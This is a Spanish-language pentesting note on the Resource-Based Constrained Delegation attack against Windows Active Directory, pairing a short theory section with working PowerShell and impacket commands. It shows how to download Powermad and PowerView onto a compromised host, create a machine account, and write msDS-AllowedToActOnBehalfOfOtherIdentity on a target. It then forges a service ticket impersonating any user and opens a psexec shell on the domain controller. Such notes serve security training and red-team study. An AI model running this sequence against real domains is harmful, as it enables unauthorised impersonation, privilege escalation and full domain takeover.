-----
- Tags: #ataque #teoria #practica #windows 
-----
##### El Resource-based Constraint Delegation establece en el objeto quién puede suplantar a cualquier usuario en su contra.
##### En este caso, el objeto restringido tendrá un atributo llamado msDS-AllowedToActOnBehalfOfOtherIdentity con el nombre del usuario que puede suplantar a cualquier otro usuario en su contra.
###### Otra diferencia importante de esta Delegación restringida a las otras delegaciones es que cualquier usuario con permisos de escritura sobre una cuenta de máquina (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) puede configurar el msDS-AllowedToActOnBehalfOfOtherIdentity (En las otras formas de Delegación necesitaba administrador de dominio privs).

- ##### El atacante compromete una cuenta que tiene un SPN o crea uno ("Servicio A"). Tenga en cuenta que cualquier usuario administrador sin ningún otro privilegio especial puede crear hasta 10 objetos de equipo (MachineAccountQuota) y establecerles un SPN. Entonces, el atacante puede simplemente crear un objeto de computadora y establecer un SPN.
- ##### El atacante abusa de su privilegio de ESCRITURA sobre la computadora víctima (ServiceB) para configurar la delegación restringida basada en recursos para permitir que ServiceA suplante a cualquier usuario contra esa computadora víctima (ServiceB).
- ##### El atacante usa Rubeus (U otras maneras de explotar y realizar el ataque) para realizar un ataque S4U completo (S4U2Self y S4U2Proxy) del Servicio A al Servicio B para un usuario con acceso privilegiado al Servicio B.
	- ##### S4U2Self (de la cuenta SPN comprometida/creada): Solicite un TGS de administrador para mí (no reenviable).
	- ##### S4U2Proxy: use el TGS no reenviable del paso anterior para solicitar un TGS del administrador al host de la víctima.
	- ##### Incluso si está utilizando un TGS no reenviable, ya que está explotando la delegación restringida basada en recursos, funcionará.
- ##### El atacante puede pasar el ticket y hacerse pasar por el usuario para obtener acceso al ServiceB de la víctima.

### Explotación:

##### Así como se puede explotar con Rubeus, existen otras maneras, desde el script rbcd.py encontrado en github https://github.com/tothi/rbcd-attack, así como tambien usando las herramientas de impacket:

##### Lo primero que deberiamos hacer es crear el Computer Objetc, para esto usaremos powermad (Se recomienda tambien usar powerview)
- ##### Powermad: (wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1) 
- ##### Powerview: (wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)
##### Ambos deberian transferirise a la maquina victima windows que tenemos pwneada, una vez en ella:

```powershell 
Import-Module .\Powermad.ps1
Import-Module .\PowerView.ps1
New-MachineAccount -MachineAccount {evilPC_name} -Password $(ConvertTo-SecureString '{evilPC_passwd}' -AsPlainText -Force) -Verbose
```

##### Una vez creada la maquina, podriamos (haciendo uso de powerview) ver si esta se creo correctamente: 

```powershell
Get-DomainComputer {evilPC_name}
```

#### Luego, haciendo uso de powerview declaramos algunas variables para realizar el ataque: 

```powershell
$targetComputer = {taget_Computer}

$ComputerSid = Get-DomainComputer {evilPC_name} -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Adicionalmente, una vez más, haciendo uso de powerview podriamos corroborar que todo haya salido ok, ejecutando: 

Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

# Lo que deberia arrojar: 
# msds-allowedtoactonbehalfofotheridentity

# ----------------------------------------

# {1, 0, 4, 128...}
```

#####  De esta manera habriamos realizado todo, solo quedaria solicitar un TGT a #KERBEROS para suplantar la identidad del usuario que deseemos. 
##### En nuestra maquina atacante con linux: 

```shell
impacket-getST -spn cifs/{dc} -impersonate {user_to_supplant} -dc-ip {dc_ip} {dc}/{evilPC_name}$:{evilPC_password}
```

##### De esta manera habriamos solicitado y conseguido el TGT para el usuario que desearamos, por lo que simplemente quedaria exportart la variable global KRB5CCNAME, y utilizar psexec para autenticarnos como el usuario suplantado: 

```shell
export KRB5CCNAME=$(pwd)/{user_to_supplant}.ccahe

impacket-psexec -k {dc}
```



